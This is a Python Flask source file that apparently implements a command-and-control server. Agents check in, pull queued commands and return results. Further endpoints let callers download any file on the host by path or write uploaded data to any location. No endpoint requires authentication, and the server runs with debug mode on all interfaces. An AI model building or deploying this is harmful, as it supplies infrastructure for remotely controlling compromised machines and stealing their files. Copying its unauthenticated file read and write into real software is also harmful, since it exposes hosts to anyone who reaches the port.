import os
import base64
import sqlite3
from flask import Flask, request, jsonify
from datetime import datetime

app = Flask(__name__)

DB_FILE = "db.sqlite"

def init_db():
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS agents (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id INTEGER UNIQUE,
            hostname TEXT,
            last_seen TIMESTAMP
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id INTEGER,
            command_text TEXT,
            arguments TEXT,
            status TEXT DEFAULT 'pending',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS results (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            command_id INTEGER,
            result_data TEXT,
            exit_code INTEGER,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)
    cursor.execute("CREATE TABLE IF NOT EXISTS sent_results (result_id INTEGER PRIMARY KEY)")
    conn.commit()
    conn.close()

init_db()

@app.route('/api/client/checkin', methods=['POST'])
def checkin():
    data = request.get_json() or {}
    agent_id = data.get('agent_id', 1)
    hostname = data.get('hostname', 'unknown')

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("INSERT OR REPLACE INTO agents (agent_id, hostname, last_seen) VALUES (?, ?, ?)",
                   (agent_id, hostname, datetime.utcnow()))
    conn.commit()
    conn.close()
    return jsonify({"status": "success"}), 200

@app.route('/api/client/get-command', methods=['GET'])
def get_command():
    agent_id = request.args.get('agent_id', 1, type=int)

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("""
        SELECT id, command_text, arguments
        FROM commands
        WHERE agent_id = ? AND status = 'pending'
        ORDER BY created_at ASC
        LIMIT 1
    """, (agent_id,))
    row = cursor.fetchone()

    if row:
        cmd_id, cmd_text, args = row
        cursor.execute("UPDATE commands SET status = 'running' WHERE id = ?", (cmd_id,))
        conn.commit()
        conn.close()
        return jsonify({
            "status": "success",
            "command_id": cmd_id,
            "command_text": cmd_text,
            "arguments": args or ""
        })
    conn.close()
    return jsonify({"status": "no_command"}), 200

@app.route('/api/client/results', methods=['POST'])
def receive_result():
    data = request.get_json() or {}
    command_id = data.get('command_id')
    result = data.get('result', '')
    status = data.get('status', True)

    if not command_id:
        return jsonify({"status": "error"}), 400

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("""
        INSERT INTO results (command_id, result_data, exit_code)
        VALUES (?, ?, ?)
    """, (command_id, result, 0 if status else 1))
    cursor.execute("UPDATE commands SET status = 'completed' WHERE id = ?", (command_id,))
    conn.commit()
    conn.close()
    return jsonify({"status": "success"}), 200

@app.route('/api/admin/commands', methods=['POST'])
def create_command():
    data = request.get_json() or {}
    agent_id = data.get('agent_id', 1)
    command_text = data.get('command_text', '').strip()
    arguments = data.get('arguments', '')

    if not command_text:
        return jsonify({"status": "error", "message": "No command provided"}), 400

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("""
        INSERT INTO commands (agent_id, command_text, arguments)
        VALUES (?, ?, ?)
    """, (agent_id, command_text, arguments))
    cmd_id = cursor.lastrowid
    conn.commit()
    conn.close()

    return jsonify({
        "status": "success",
        "id": cmd_id
    }), 201

@app.route('/api/client/download', methods=['POST'])
def client_download():
    data = request.get_json() or {}
    file_path = data.get('path', '').strip()

    if not file_path:
        return jsonify({"status": "error", "message": "No file path provided"}), 400

    try:
        full_path = os.path.abspath(file_path)
        if not os.path.exists(full_path):
            return jsonify({"status": "error", "message": "File not found"}), 404

        if os.path.isdir(full_path):
            return jsonify({"status": "error", "message": "Path is a directory"}), 400

        with open(full_path, 'rb') as f:
            file_data = base64.b64encode(f.read()).decode('utf-8')

        return jsonify({
            "status": "success",
            "filename": os.path.basename(full_path),
            "data": file_data,
            "size": os.path.getsize(full_path)
        })
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/client/upload', methods=['POST'])
def client_upload():
    data = request.get_json() or {}
    file_path = data.get('path', '').strip()
    file_data = data.get('data', '')
    filename = data.get('filename', 'uploaded_file')

    if not file_path or not file_data:
        return jsonify({"status": "error", "message": "Missing path or file data"}), 400

    try:
        full_path = os.path.abspath(os.path.join(file_path, filename))
        os.makedirs(os.path.dirname(full_path), exist_ok=True)

        with open(full_path, 'wb') as f:
            f.write(base64.b64decode(file_data))

        return jsonify({
            "status": "success",
            "message": f"File uploaded to {full_path}"
        })
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)